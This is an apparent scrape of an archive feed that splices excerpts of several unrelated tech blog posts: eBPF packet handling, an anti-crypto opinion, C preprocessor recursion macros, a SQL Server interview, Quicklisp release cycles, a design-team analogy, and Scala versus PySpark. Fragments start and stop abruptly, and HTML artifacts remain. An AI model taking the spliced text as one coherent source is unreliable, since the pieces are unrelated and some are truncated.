use case we had so that we can keep it in the back of our mind as a concrete
example.</p>
<p>We have a set of servers that accept traffic on a particular port and then
aggregate and display this data to the users. This traffic was coming from a
single source and contained data about a single entity.</p>
<p><img src="https://kbknapp.dev/imgs/ebpf_01.png" alt="fig. 01"></p>
<p>The server application was designed to handle multiple external sources, where
each source comes in over a different port.</p>
<p><img src="https://kbknapp.dev/imgs/ebpf_02.png" alt="fig. 02"></p>
<blockquote>
<p><strong>Future Kevin Says</strong>
</p>
Before we go any further I should (I want to) explain that we did not design or
build this server application or architecture. We don't have control over how
or why it operates this way.
<p>
(´ ͡༎ຶ ͜ʖ ͡༎ຶ )
</p>
</blockquote>
<p>One day we get notified that we will be receiving multiple entities from a
single external source over a single port. This is a problem for the server
application which has no knowledge of the "entities" and only differentiates
ports.</p>
<p><img src="https://kbknapp.dev/imgs/ebpf_03.png" alt="fig. 03"></p>
<p>The boss says we need a solution to trick the server application into thinking
all these entities came from different ports. Why can't we just actually use
different ports, you ask? As mentioned, we don't control those external sources.</p>
<blockquote>
<p><strong>Future Kevin Says</strong>
</p>
...hence the "external"
<p>
ᕕ(⌐■_■)ᕗ ♪♬
</p>
</blockquote>
<p>Luckily, the packets as the come across the wire have byte tags in the payload
that differentiate entities.</p>
<p>I can hear you now, "Easy! Just use <code>iptables</code> with <code>-m string</code> to match the
bytes and clone the packets with <code>-j TEE</code> to another port via the <code>mangle</code>
table!"</p>
<p>Slow down buckaroo. It turns out I didn't give you all the details in order ot
keep this simple enough for a blog series. We also have some strict validation
requirements along with this new multiple-entities-from-a-single-source
"upgrade." For the sake of this series we'll just use a narrow window for
payload size narrow payload size (in addition to this entity:port mapping).</p>
<p>Just to be clear, we're in a situation where we don't control the server
application, don't control the source of the packets, are getting new
requirements piled on, and are expected to produce some magic to keep things
operating as if nothing changed.</p>
<p>The solution should:</p>
<ul>
<li>Validate the packet</li>
<li>Inspect packet payload to determine entity</li>
<li>Apply some kind of mangle with an entity:port mapping</li>
<li>Ideally we'd like something that is easily extendable to meet any surprise
follow on requirements as well.</li>
</ul>
<p>Oh, and we could be receiving a high volume of these packets so performance is
key (i.e. a userspace implementation will probably not fly).</p>
<p><img src="https://kbknapp.dev/imgs/ebpf_04.png" alt="fig. 04"></p>
<p>So there are probably many ways to solve this particular issue. </p>
<h2 id="ebpf-has-entered-the-chat"><strong>eBPF has entered the chat</strong></h2>
<p>Having heard of eBPF and specifically XDP, I wanted to dig in and see how
difficult this would be for us to implement. In theory, it'd be a quick program
that could be implemented in almost no time, not require any modifications to
either the server application or external source system, and not impact
performance. Win, win, win.</p>
<p>This did, and didn't play out.</p>
<p>eBPF can absolutely solve this problem well. It isn't that difficult, and is
extremely performant.</p>
<blockquote>
<p><strong>Future Kevin Says</strong>
</p>
You feel a "but" coming on, don't you?...me to
<p>
( ͡° ͜ʖ ͡°)
</p>
</blockquote>
<p>BUT, it required a lot C.</p>
<blockquote>
<p><strong>Future Kevin Says</strong>
</p>
Here (and always) "C" also stands for confusion
(jokes, just jokes)
<p>
(☞ﾟ∀ﾟ)☞
</p>
</blockquote>
<p>Just getting into eBPF was more of a challenge than I'd like. Because it's such
a low level technology, and there are "competing" ecosystems I found the whole
space confusing at first. Of course once I navigated the waters, everything
makes sense and I can see why things are the way they are. Call it survivors
bias, perhaps.</p>
<p>So the teaser is that it works, but that getting into the ecosystem was
difficult. And even though the C wasn't too bad, I'd <em>much</em> rather be writing
Rust. As it turns out, there is quite an excellent set of eBPF crates for Rust.</p>
<p>But this is still part 1, so lets first back up and go over the high level wave
tops of what eBPF actually is.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>This post was inspired by a question on Reddit: How much of your investment portofolio is crypto?</p><p>Well, my answer is 0%, and it will remain 0% forever.</p><p>I don't see the value in it, and the people who advocate for them are hypocrites: they say they get into
crypto as a rebellion act against the current FIAT system that is controlled by governments, while
day-dreaming about selling it for a huge profit (in FIAT currency).
Every advocate promotes holding, which is not what a currency is for: currencies are meant to be
a medium of exchange and to change hands.</p><p>Also, I see rampant misunderstanding of basic economics in people who advocate for it:</p><ul><li><p>they say that the fact that it is deflationary and can not see inflation is a good thing, when it is
actually a bad thing. There is a reason the target inflation is at ~2% almost everywhere.
We need inflation to keep the economy going.</p></li><li><p>they say that it's a currency, when it's not. It is not accessible to everybody
(not everybody has access to internet).</p></li><li><p>if you lose your key, you lose the access to your wallet for good and nobody can help you.
People seem to not understand how bad this is. Imagine people losing everything because of one silly mistake.</p></li><li><p>Volatility is the enemy of any economy market: we need stability and predictability to avoid mayhem:
businesses need predictability to prepare their stocks, factories need predictability to produce goods,
people need predictability to budget and make long-term plans. Sure, long term plans usually don't go as planned,
but you don't want to rethink your entire strategy on a weekly basis because of some wild fluctuation (this week a
car costs 0.5BTC, next week it will be 5BTC). Because of volatility you can't even save for the future.</p></li></ul><p>Also, as a technology, blockchain itself it's not that impressive. At its core, it is a decentralized
slow read-only database which needs as lot of power to run, which do not have many real-life useful applications.
Yeah, some would argue that having a decentralized zero-trust database would be an advantage, but
I am yet to see a system using blockchain, where a normal database is not enough.</p><p>The only real-life application I could see is in audit trailing, where the decentralization part
is useless (only the chaining of blocks by hashing is useful there, to avoid tampering with past entries),
but that use-case is not related to the reason blockchain advocates promote it.</p><p>Every time some company announces that they will build their own blockchain solution, the blockchain
community celebrates, because they consider it to be proof that blockchain is the future, but in fact,
it's a massive counter-argument against the core belief they promote: decentralization.
The fact that a company is building their own, it means that they will control it.</p><h3>Conclusion</h3><p>In my opinion, Bitcoin is a fad and it's value is given by two things: people who have too much faith in an asset that
is not really an asset and has no use except offering a field for speculation, and the FOMO of people who get caught in
the heat of the moment and buy when a friend tells them to buy or mass-media brings it to the public attention
once very few months.</p><p>This article is a personal opinion, and represents no financial advice. I am in not saying "sell" or "buy".
Do your own research (thoroughly).</p></div></div></div>]]>

<![CDATA[Is the C preprocessor Turing complete?]]>

February 8, 2021 | https://pfultz2.com/blog/2012/05/10/turing/ | <a href="https://web.archive.org/web/*/https://pfultz2.com/blog/2012/05/10/turing/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  <p>One of the requirements for a language to be turing complete, is that it must be able to implement recursion. As we all know macros don’t expand recursively, but there are ways we can work around this.</p>

<p>The easiest way of doing recursion in the preprocessor is to use a deferred expression. A deferred expression is an expression that requires more scans to fully expand:</p>

<div><div><pre><code>#define EMPTY()
#define DEFER(id) id EMPTY()
#define OBSTRUCT(...) __VA_ARGS__ DEFER(EMPTY)()
#define EXPAND(...) __VA_ARGS__

#define A() 123
A() // Expands to 123
DEFER(A)() // Expands to A () because it requires one more scan to fully expand
EXPAND(DEFER(A)()) // Expands to 123, because the EXPAND macro forces another scan
</code></pre></div></div>

<p>Why is this important? Well when a macro is scanned and expanding, it creates a disabling context. This disabling context will cause a token, that refers to the currently expanding macro, to be painted blue. Thus, once its painted blue, the macro will no longer expand. This is why macros don’t expand recursively. However, a disabling context only exists during one scan, so by deferring an expansion we can prevent our macros from becoming painted blue. We will just need to apply more scans to the expression. We can do that using this <code>EVAL</code> macro:</p>

<div><div><pre><code>#define EVAL(...)  EVAL1(EVAL1(EVAL1(__VA_ARGS__)))
#define EVAL1(...) EVAL2(EVAL2(EVAL2(__VA_ARGS__)))
#define EVAL2(...) EVAL3(EVAL3(EVAL3(__VA_ARGS__)))
#define EVAL3(...) EVAL4(EVAL4(EVAL4(__VA_ARGS__)))
#define EVAL4(...) EVAL5(EVAL5(EVAL5(__VA_ARGS__)))
#define EVAL5(...) __VA_ARGS__
</code></pre></div></div>

<p>Now if we want to implement a <code>REPEAT</code> macro using recursion, first we need some increment and decrement operators to handle state:</p>

<div><div><pre><code>#define CAT(a, ...) PRIMITIVE_CAT(a, __VA_ARGS__)
#define PRIMITIVE_CAT(a, ...) a ## __VA_ARGS__

#define INC(x) PRIMITIVE_CAT(INC_, x)
#define INC_0 1
#define INC_1 2
#define INC_2 3
#define INC_3 4
#define INC_4 5
#define INC_5 6
#define INC_6 7
#define INC_7 8
#define INC_8 9
#define INC_9 9

#define DEC(x) PRIMITIVE_CAT(DEC_, x)
#define DEC_0 0
#define DEC_1 0
#define DEC_2 1
#define DEC_3 2
#define DEC_4 3
#define DEC_5 4
#define DEC_6 5
#define DEC_7 6
#define DEC_8 7
#define DEC_9 8
</code></pre></div></div>

<p>Next we need a few more macros to do logic:</p>

<div><div><pre><code>#define CHECK_N(x, n, ...) n
#define CHECK(...) CHECK_N(__VA_ARGS__, 0,)

#define NOT(x) CHECK(PRIMITIVE_CAT(NOT_, x))
#define NOT_0 ~, 1,

#define COMPL(b) PRIMITIVE_CAT(COMPL_, b)
#define COMPL_0 1
#define COMPL_1 0

#define BOOL(x) COMPL(NOT(x))

#define IIF(c) PRIMITIVE_CAT(IIF_, c)
#define IIF_0(t, ...) __VA_ARGS__
#define IIF_1(t, ...) t

#define IF(c) IIF(BOOL(c))

#define EAT(...)
#define EXPAND(...) __VA_ARGS__
#define WHEN(c) IF(c)(EXPAND, EAT)
</code></pre></div></div>

<p>Now with all these macros we can write a recursive <code>REPEAT</code> macro. We use a <code>REPEAT_INDIRECT</code> macro to refer back to itself recursively. This prevents the macro from being painted blue, since it will expand on a different scan(and using a different disabling context). We use <code>OBSTRUCT</code> here, which will defer the expansion twice. This is necessary because the conditional <code>WHEN</code> applies one scan already.</p>

<div><div><pre><code>#define REPEAT(count, macro, ...) \
    WHEN(count) \
    ( \
        OBSTRUCT(REPEAT_INDIRECT) () \
        ( \
            DEC(count), macro, __VA_ARGS__ \
        ) \
        OBSTRUCT(macro) \
        ( \
            DEC(count), __VA_ARGS__ \
        ) \
    )
#define REPEAT_INDIRECT() REPEAT

//An example of using this macro
#define M(i, _) i
EVAL(REPEAT(8, M, ~)) // 0 1 2 3 4 5 6 7
</code></pre></div></div>

<p>Now this example is limited to 10 repeats, because of limitations of the counter. Just like a repeat counter in a computer would be limited by the finite memory. Multiple repeat counters could be combined together to workaround this limitation, just like in a computer. Furthermore, we could define a <code>FOREVER</code> macro:</p>

<div><div><pre><code>#define FOREVER() \
    ? \
    DEFER(FOREVER_INDIRECT) () ()
#define FOREVER_INDIRECT() FOREVER
// Outputs question marks forever
EVAL(FOREVER())
</code></pre></div></div>

<p>This will try to output <code>?</code> forever, but will eventually stop because there are no more scans being applied. Now the question is, if we gave it an infinite number of scans would this algorithm complete? This is known as the halting problem, and Turing completeness is necessary to prove the undecidability of the halting problem. So as you can see, the preprocessor can act as a Turing complete language, but instead of being limited to the finite memory of a computer it is instead limited by the finite number of scans applied.</p>

Nothing scales worth a damn. Even stuff that looks easy, like Amazon S3 file storage, can run into scaling problems if you design it without an analysis of how AWS partitions reads,&nbsp;and how you have to watch out for your object prefixes.</p><p>But the thing is, nobody <a href="https://acloudguru.com/blog/engineering/the-career-changing-art-of-reading-the-docs">reads the documentation</a>.</p><p>Oh sure, they read page 1, they build the Hello World version, and then they start building an app without any regards whatsoever for how the design is gonna perform. (Sometimes, there’s not even a design – folks just start coding willy-nilly.)</p><p>So I kinda chuckle when I see folks say that something won’t scale – nothing will. It’s a poor musician that blames his instrument. Pick the persistence layer that you know the best, because that’s a hedge against you making dumb design decisions that will come back to haunt you later. The more mistakes you’ve made in the past with a tool, the more likely it is that you won’t make those mistakes again.</p><p>If you choose a persistence layer you’ve never used in production before, and your app becomes popular, you’re gonna be paying for the mistakes you made early on – or the mistakes the persistence layer made for you.</p><p><strong>So with that said, are there other reasons to choose SQL Server today, beyond “it’s what I already know?”</strong></p><p>When your application gets implemented at a 10,000-employee company, you start to get a lot more enterprise-sounding requests from different departments. For example, Sam from security needs to audit which users have changed data over the last 30 days, and Annabel from accounting needs your app to sync tax data with SAP.</p><p>In environments like this, it’s much more common to use Grandpa’s relational database because it’s already got a lot of built-in functionality to help accomplish these goals, and it’s easier to hire people off the street who know how to do it.</p><p>If you’re building a new web site or SaaS tool, and you’re going to be the only company that ever hosts it, then you have a lot of flexibility to choose the data persistence layer you want. You can use Database du Jour without problems. But if you wanna sell an app into 10,000-employee companies, you’re gonna get faster sales if you use a database they support.</p><p><strong>You’ve achieved such renown for your eponymous SQL Server helper tools that your name is sometimes&nbsp;<a href="https://www.linkedin.com/feed/update/urn:li:activity:6758016561585487872/" target="_blank" rel="noreferrer noopener">simply listed as a required skill on DBA job postings</a>. This is probably not a realistic goal for most of us. That said, what are a few career steps you recommend to become a trusted DBA?</strong></p><p>[Laughs] Yeah, that was surreal.</p><p>To become a trusted DBA – or a trusted anything – freely share what you know on a web site with your name on it.</p><p>Sharing knowledge accomplishes several different things. First, if a prospective boss or coworker Googles you, they’ll find your name, read what you wrote, and say, “Hey, this person really does seem to know stuff that I don’t know.” The dates on your blog posts also establish a track record of what you’ve known over time, and how it’s grown.</p><p>In the beginning, your goal is to be found if people Google your name. That’s fairly easy. Later on, as you start to accumulate more writings, people are also going to run across them when they Google for the subject matter, too, even without including your name. That’s when you’ll start building an audience – and people worry about that first, but hold off. Just start by building a public track record under your name, and the rest will start to snowball.&nbsp;</p><hr><p><em>If you’re looking to get skilled up on Azure, Microsoft is currently offering 50% off AZ-900 exam vouchers to anyone who completes <a href="https://acloudguru.com/course/az-900-microsoft-azure-fundamentals">ACG’s free prep course</a>!</em></p><hr><p><strong>AWS has recently announced an open-source translation tool called Babelfish, which is an aggressive attempt to get people off SQL Server and onto open-source database engines such as Postgres.

If you’re AWS, you look at Microsoft’s pile of cash, and you build features like Babelfish that will help SQL Server users migrate down and save money. Everything slowly becomes a less expensive commodity. (If this kind of thing interests you, search for <a href="https://acloudguru.com/course/wardley-mapping">Wardley value mapping</a> – it’s really neat stuff.)</p><p>I’m really excited about AWS Babelfish because it encourages Microsoft to start defending their value proposition.

I think it made sense for Microsoft to hedge their bets and start making the investments necessary to survive in datacenters 10-20-30 years from now. It’s a hedge, though: it shouldn’t be your first default choice for running SQL Server.

It’s there if you&nbsp;<em>have</em>&nbsp;to have it, but otherwise, you should wait for a few years until you really need it. Right now, it’s just kinda there for experiments.</p><p>The one place where you might&nbsp;<em>have</em>&nbsp;to have it is throwaway environments for continuous integration.

February 8, 2021 | https://lisp-journey.gitlab.io/blog/why-do-we-have-to-wait-one-month-before-quicklisp-updates/ | <a href="https://web.archive.org/web/*/https://lisp-journey.gitlab.io/blog/why-do-we-have-to-wait-one-month-before-quicklisp-updates/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>If you didn’t know that, now you do. Quicklisp releases software
updates once a month (see
<a href="http://blog.quicklisp.org/">Quicklisp’s blog</a>). I didn’t know why, it
isn’t explained on its website, so I asked
(<a href="https://github.com/quicklisp/quicklisp-client/issues/148">issue #148</a>). I
found the discussion very insightful, everybody being constructive,
existing solutions being discussed and architectural choices
explained. But it ended up brutally with one more Common Lisp oddity.</p>

<p>My first impression was that this fact is annoying, because it already
prevented me a couple of times to use my own library and its most
recent updates into other projects. They would pull the lib from
Quicklisp but wouldn’t benefit from its latest features.</p>

<p>This way of doing was also not the package management model I was most
used to (pip, npm,…), but by wording things differently it makes more
sense to me. As an user says:</p>

<blockquote>
<p>I think it is a very unique to quicklisp, making sure that everything compiles together. I can’t think of any other libraries/frameworks system on other languages/platforms that would go as far. Really great work.</p>
</blockquote>

<p>So <em>Quicklisp is more than a package manager</em>, it is a “dist” builder
ensuring everything works together, closer to apt than to pip.</p>

<p>The situation and shortcomings is well described by axity on
<a href="https://www.axity.net/blog/article/8">his blog post</a> (now showing a
404):</p>

<blockquote>
<p>Zach Beane has done an excellent job with Quicklisp, and it is far better than what we previously had available, but still has a few problems. Zach puts a lot of effort into curating a list of compatible software together into the form of a “Quicklisp dist” rolled out approximately every month. While this is great and puts near-zero maintenance on developers, it poses a few problems.</p>

<p>Firstly, Zach is a single point of failure. Yes, anyone can maintain their very own Quicklisp dist, but it isn’t going to see the masses, and the Quicklisp internals are not very well understood by anyone other than Zach.</p>

<p>Also the fact that the official dists are rolled out so far apart (a month or longer in the software world is an eternity), means developers cannot push hot-fixes or address user-reported bugs in a timely manner, without pushing maintenance onto the users by having them checkout upstream sources.</p>

<p>Modern languages such as Julia and Racket offer central repositories where a developer can register their software projects, and will be automatically indexed periodically, so that users can continue to install and update software without any maintenance, and still receive updates quickly when needed. Additionally, they push managing version dependencies onto the developer, which I do not believe to be a bad thing. In contrast, Common Lisp libraries are rarely versioned, and all of that maintenance is forced upon the Quicklisp dist curator.</p>
</blockquote>

<p>I also like /u/ruricolist’s explanations
(<a href="https://www.reddit.com/r/lisp/comments/6snw5d/questions_for_2017_common_lisp_experts/dljcuz9/">on reddit</a>):</p>

<blockquote>
<p>Quicklisp provides more assurance than you might expect. The criterion for inclusion, and maintenance, of a project in Quicklisp is that the project successfully load in SBCL alongside all the libraries in that Quicklisp distribution, and load without any errors or warnings. SBCL has extensive type inference and can catch and warn about many potential issues at compile time. And because of the pervasive use of macros in CL, successfully loading a library usually exercises a lot of code paths in its dependencies. To a surprising extent, “if it loads, it runs.”</p>

<p>Qlot isn’t something a library would use. You use it to set up the dependencies for an application. My approach (with TBRSS) is this. Obviously, every time I upgrade to a new Quicklisp dist, I run a test suite to make sure everything is working together. On the rare occasion there’s a problem, I either pin the offending library to an older version (with Qlot) or I fork it and fix it, again using Qlot to pull from the fork until the fix makes it into the next Quicklisp dist. And of course I also use Qlot for dependencies that are not, for whatever reason, available in Quicklisp.</p>
</blockquote>

<hr>

<p>So Quicklisp’s author answers:</p>

<blockquote>
<p>The work relying on me is that I build everything in Quicklisp to make sure they build together before making a release. This covers a useful class of bugs. I’d love to incorporate more tests in the process to catch release problems that don’t manifest at build time.</p>

<p>I hope to make it easier for people to learn how to make their own dists. Then people will have the opportunity to make new software sets following the policies that are most important to them. I think there’s also plenty of room for other package managers for Common Lisp - maybe something styled more like clbuild would suit people who want instant access to updates.</p>
</blockquote>

<p>Why a month ?</p>

<blockquote>
<p>A month between updates is a compromise between chaos and stability.</p>

<p>I don’t think shorter release cycles are an unqualified good. In my experience, short release cycles can lead to instability and unpredictability, and I chose one month as a balance between getting timely updates and having a reliable, stable base.</p>

<p>The most labor-intensive part of making releases is monitoring daily failures and reporting bugs to the right people. The daily failure report is automated, but reporting bugs (and following up) can be a slog.</p>
</blockquote>

<p>Then the discussion began. When voices support more frequent releases,
Zach advertises again
<a href="https://github.com/quicklisp/quicklisp-controller">quicklisp-controller</a>;
I read one (and only one) small but direct criticism towards the
maintainer:</p>

<blockquote>
<p>@Hexstream I don’t think a fork will be required. I think this is less of an issue with @xach not willing to make changes required by the community and more of lack of manpower that’s willing and able to take up the burden of building and maintaining an automated Quicklisp dist/repository.</p>
</blockquote>

<p>A one month update has its supporters, of course:</p>

<blockquote>
<p>I have benefited multiple times from the 1 month release cycle and the due diligence that Xach and others put in every month. Even if they had a team of 50 I’d still vote to keep it as it is now. Making a separate dist is far more sensible if you need extra control over delivery times and it will still play well with quicklisp and your other projects.</p>
</blockquote>

<p>I asked whether it would be possible to specify a git version, and I&nbsp;had an explanation:</p>

<blockquote>
<p>Regarding pulling from git in the client, Quicklisp doesn’t work like that. I did not want to rely on external processes in order to be portable to all Common Lisp implementations and platforms. This was a real issue in clbuild and asdf-install.</p>

<p>If you want to update a bugfix of your library, fix it, and wait a month.</p>
</blockquote>

<p>and the reminder to try <a href="https://github.com/fukamachi/qlot">Qlot</a>,
which allows exactly that (and to set dependencies locally).</p>

<blockquote>
<p>Qlot will not help if you are writing a library and want to push fixes to its users quickly. It only helps for end-user application development. It works similar to virtualenv + pip (requirements.txt) from Python’s world, for example.</p>
</blockquote>

<p>Phoe summed up the situation:</p>

<blockquote>
<p>This thread is turning into a discussion about “why X approach is better than Quicklisp approach” which leads to a fruitful, but dead point.</p>

<p>If someone is not satisfied with the way the current Quicklisp dist works and would rather have a more automated solution, then they are free to extend the quicklisp-controller to their liking and implement the required functionality for:</p>

<ul>
<li>creating a centralized service that acts as a QL repository and dist manager,</li>
<li>allowing the authors to upload and/or update their projects on that service,</li>
<li>setting up a CI test loop on that service for verifying that the packages build,</li>
<li>automatically updating the service’s dists with new releases,</li>
<li>maintaining all of the above.</li>
</ul>

<p>Until such a person or group of people appears, nothing is going to be be achieved and nothing in Quicklisp is going to change.</p>

<p>Talk is cheap - @xach has at least built something that works and can act as a foundation.</p>
</blockquote>

<p>And now, after only 17 messages to the thread, Zach Beane closes the thread:</p>

<blockquote>
<p>I can appreciate there are other approaches that have advantages over how Quicklisp works. I hope this thread has helped shed some light on why it works the way it does, and my hopes for the future. I’m not against requests for changes, but not all of them can or will be accommodated. I’m also fully in favour of people doing their own thing if they have other priorities, experiences, and preferences - I think it would be great if there were even more options for Common Lisp project management.</p>

<p>Closing this for now - thanks for the discussion.</p>
</blockquote>

<p>Hexstream had just the time to disagree</p>

<blockquote>
<p>Generally agree with your last comment, but I just wanted to express my discontent at the premature closing of this thread, it seemed pretty fruitful to me and I don’t think it had yet reached a point of serious diminishing returns.</p>

<p>(Your project, your rules, though.)</p>
</blockquote>

<p>and this is it.</p>

<hr>

<p>I think, and I’m not the only one, that the thread was fruitful.</p>

<p>Indeed, we had explanations (that don’t appear in the doc), we had
presentation of means to the resolution (in no doc), we had the
presentation of how to fix the mentioned problem for library
developers (Qlot, comprehensibly not referenced in Quicklisp doc, and little talked
about over here), we had questions regarding the lack of documentation
that could be tracked from this thread (Zach too said he wanted to
write more doc). And I think the discussion was professional, with no
animosity. So we could have tracked some progress, maybe we would have
received more tips, but more importantly we’d have been done with this
question.</p>

<p>But the thread is closed O_o Preventing people from communicating
means preventing people from learning from each
other, and thus makes the CL world evolving slower. Or people
quitting, or simply be very surprised and not staying here. Indeed,
it’s a negative feeling to see that. Why did Zach close the thread ?
Is he bored of this discussion ? He can ignore it. Bored of being
asked that ? It’s a recurrent question in reddit and in blogs. But
this issue is the only mention of the subject on Quicklisp’s website and
repository. Closing it makes it much less visible.</p></div></div>

  <h2>A sad state of affairs</h2>
<p>The truth is – that most workflows are like this:</p>
<p>There’s a&nbsp;king&nbsp;somewhere and they want to have something created(the client or the boss). They are bored and want to appear like they are doing something important. They’re already rich, so – it actually doesn’t matter what ‘the thing’ is. They hire a bard/court&nbsp;<strong>jester</strong> or some ‘creative’ (the “designer” as you called it) to come and make it so.</p>

  <p>Stańczyk&nbsp;- King's Jester.</p>



  <text-content>
    <p>The jester has lived a life of laughter and applause and <em>brutal beatings</em>. They aren’t entrusted with the power to make decisions on their own, so they suffer the consequences of the king’s emotions. Because of this, they’ve lost their self-respect – and no longer work for joy, but in fear that they will be cast out into the street.</p>
<p>The jester says, “how about this” – and the king says… “<em>No</em>. that’s not right. and so the jester says… “well… what about this?” – and they go on and on&nbsp;and on&nbsp;until the king’s emotions are ‘happy’ or they tire out and just say “ok.”</p>

  <p>Jefferson David Chalfant&nbsp;- The Blacksmith</p>



  <text-content>
    <p>Then the jester gets sign-off from the king (who isn’t really qualified for any of this stuff) and&nbsp;puts together a cryptic note(photoshop/invision document) and sends it to a factory of blacksmiths or a single&nbsp;<strong>blacksmith</strong> in some other country(the developers). There isn’t a lot of context.</p>
<p>The jester just waits. They pace and bite their nails and hope it turns out ok. The king either forgets about the project completely or brings the jester to court and yells at them until the project is done.</p>
<p>The people at the factory try their best to ‘make’ whatever the jester and king have come up with. The ‘designs’ they were sent have a lot of problems that weren’t thought through. It takes 3 times as long as expected and the outcome&nbsp;is still embarrassing.</p>
<p>In the end… there is a thing. And it doesn’t matter – and it doesn’t really do a job / because it wasn’t <em>designed</em> at all. It was just a bunch of anxiety and – a total waste of time. I don’t even want to try to name whatever this process is. None of these people are <em>designers.</em></p>

  <h2>Now…</h2>
<p>In an actual team of designers – the analogy would be more like a sports team or something. Everyone on the team knows how the game works. They’ve all played each and every position at some point – and now they’ve decided to specialize a bit. I’ll use baseball here.</p>
<p>The pitcher throws the ball to the catcher. the catcher throws the ball to the pitcher. At each phase, the two are working together to accomplish a common goal. There is&nbsp;<i>no king</i>. The crowd is the client / and they enjoy themselves – but they don’t tell anyone what to do. The baseball team knows what to do – and that’s why the client came to the game. There is trust and respect.</p>

  <p>This is the best analogy I can think of right now. I don’t know baseball <em>very well</em>. Sometimes the team is smaller. Basketball has only 5 players, and if you are a long-distance runner – it might just be <em>you</em> and <em>your coach</em> filling in for all the roles.</p>
<p>I think maybe a hospital/doctor team might also work – or a military unit / or <em>any team with a common goal</em> and specialization and teamwork.</p>
<p>If you are working on a team that has some ‘designers’ or ‘creatives’&nbsp;and then&nbsp;they&nbsp;finish&nbsp;their work – and then hand it off to a ‘developer’ —&nbsp;get out of there now. You aren’t going to learn – and they will fail. Go <strong>work for a team that respects Design</strong>.</p>

<p>Apache Spark code can be written with the Scala, Java, Python, or R APIs.</p>



<p>Scala and Python are the most popular APIs. This blog post performs a detailed comparison of writing Spark with Scala and Python and helps users choose the language API that’s best for their team.</p>



<p>Both language APIs are great options for most workflows. Spark lets you write elegant code to run jobs on massive datasets – it’s an amazing technology.</p>



<p>Choosing the right language API is an important decision. It’s hard to switch once you develop core libraries with one language.</p>



<p>Making the right choice is difficult because of common misconceptions like “Scala is 10x faster than Python”, which are completely misleading when comparing Scala Spark and PySpark.</p>



<p>TL;DR:</p>



<ul><li>PySpark used to be buggy and poorly supported, but that’s not true anymore. Python is a first class citizen in Spark. PySpark is a great option for most workflows.</li><li>More people are familiar with Python, so PySpark is naturally their first choice when using Spark.</li><li>Many programmers are terrified of Scala because of its reputation as a super-complex language. They don’t know that Spark code can be written with basic Scala language features that you can learn in a day. You don’t need to “learn Scala” or “learn functional programming” to write Spark code with Scala. You can stick to basic language features like <code>if</code>, <code>class</code>, and <code>object</code>, write code that looks exactly like Python, and enjoy the benefits of the Scala ecosystem.</li><li>Scala is a compile-time, type-safe language, so it offers certain features that cannot be offered in PySpark, like Datasets. Compile time checks give an awesome developer experience when working with an IDE like IntelliJ.</li><li>A lot of the Scala advantages don’t matter in the Databricks notebook environment. Notebooks don’t support features offered by IDEs or production grade code packagers, so if you’re going to strictly work with notebooks, don’t expect to benefit from Scala’s advantages.</li><li>Python has great libraries, but most are not performant / unusable when run on a Spark cluster, so Python’s “great library ecosystem” argument doesn’t apply to PySpark (unless you’re talking about libraries that you know are performant when run on clusters).</li></ul>



<p>Let’s dig into the details and look at code to make the comparison more concrete.</p>



<h2>Chaining DataFrame transformations</h2>



<p>This section demonstrates how the <code>transform</code> method can elegantly invoke Scala functions (because functions can take two parameter lists) and isn’t quite as easy with Python.</p>



<p>Custom transformations are a great way to package Spark code. They’re easily reusable and can be composed for different analyses. They’re also easily testable as standalone units.</p>



<p>Suppose you have the following DataFrame.</p>



<pre data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">+--------+
| country|
+--------+
|  brasil|
|colombia|
|    null|
+--------+</pre>



<p>Here’s a Scala function that’ll append some text to the <code>country</code> column:</p>



<pre data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">def funify(colName: String, str: String)(df: DataFrame): DataFrame = {
  df.withColumn("funified", concat(col(colName), lit(" "), lit(str)))
}</pre>



<p>Here’s how to invoke the Scala function with the <code>Dataset#transform</code> method:</p>



<pre data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">df
  .transform(funify("country", "is awesome"))
  .show()</pre>



<pre data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">+--------+-------------------+
| country|           funified|
+--------+-------------------+
|  brasil|  brasil is awesome|
|colombia|colombia is awesome|
|    null|               null|
+--------+-------------------+</pre>



<p>Notice how the <code>funify</code> function is defined with two parameter lists and invoked with one set of arguments. The Scala programming language allows for this elegant syntax.</p>



<p>Here’s an equivalent PySpark function that’ll append to the <code>country</code> column:</p>



<pre data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">from pyspark.sql.functions import col, lit, concat

def funify(col_name, str):
    def _(df):
        return df.withColumn("funified", concat(col(col_name), lit(" "), lit(str)))
    return _</pre>



<p>Here’s how to invoke the Python function with <code>DataFrame#transform</code>:</p>



<pre data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">df.transform(funify("country", "is super fun!")).show(truncate=False)</pre>



<pre data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">+--------+----------------------+
|country |funified              |
+--------+----------------------+
|colombia|colombia is super fun!|
|brasil  |brasil is super fun!  |
|null    |null                  |
+--------+----------------------+</pre>



<p>There are <a href="https://mungingdata.com/pyspark/chaining-dataframe-transformations/">a lot of different ways to define custom PySpark transformations</a>, but nested functions seem to be the most popular.</p>



<p>Nested functions aren’t the best. They create an extra level of indentation and require two return statements, which are easy to forget. The comparative difficulty of chaining PySpark custom transformations is a downside.</p>



<h2>Datasets vs DataFrames</h2>



<p>Datasets can only be implemented in languages that are compile-time type-safe. Java and Scala are compile-time type-safe, so they support Datasets, but Python and R are not compile-time type-safe, so they only support DataFrames.</p>



<p>Datasets so useful in practice.</p>



